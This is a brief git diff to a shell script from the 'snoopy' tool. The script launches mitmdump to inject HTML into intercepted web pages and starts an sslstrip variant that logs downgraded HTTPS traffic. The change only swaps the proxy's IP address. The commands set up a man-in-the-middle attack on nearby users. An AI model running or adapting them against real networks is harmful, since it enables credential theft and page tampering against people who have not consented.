@@ -28,8 +28,8 @@ function snoopy_start {
 	python ./bin/snoopy_server.py `pwd` &
 	pid_1=$!
 	search_for=$(cat ./setup/replace_match.txt)
-	mitmdump -a 192.168.42.1 -p 3129 -P http://192.168.42.1:10000 "--replace-from-file=:~bs:$search_for:./setup/replace_html.txt" &>> /tmp/log.txt &
-	#mitmdump -a 192.168.42.1 -p 3129 -P http://192.168.42.1:10000 "--replace-from-file=:~bs:</body>:./setup/replace_html.txt" &>> /tmp/log.txt &
+	mitmdump -a 192.168.23.1 -p 3129 -P http://192.168.23.1:10000 "--replace-from-file=:~bs:$search_for:./setup/replace_html.txt" &>> /tmp/log.txt &
+	#mitmdump -a 192.168.23.1 -p 3129 -P http://192.168.23.1:10000 "--replace-from-file=:~bs:</body>:./setup/replace_html.txt" &>> /tmp/log.txt &
 	pid_2=$!
 	python ./bin/sslstripSnoopy/sslstrip.py -w ./uploads/sslstrip_snoopy.log &> /dev/null &
 	pid_3=$!
